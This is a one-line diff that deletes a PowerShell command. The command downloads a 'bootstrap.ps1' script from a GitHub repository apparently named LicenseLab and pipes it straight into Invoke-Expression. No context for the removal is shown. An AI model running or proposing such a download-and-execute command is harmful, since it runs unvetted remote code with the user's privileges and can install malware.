@@ -1,1 +1,0 @@
-irm https://raw.githubusercontent.com/T3ND41/LicenseLab/main/bootstrap.ps1 | iex
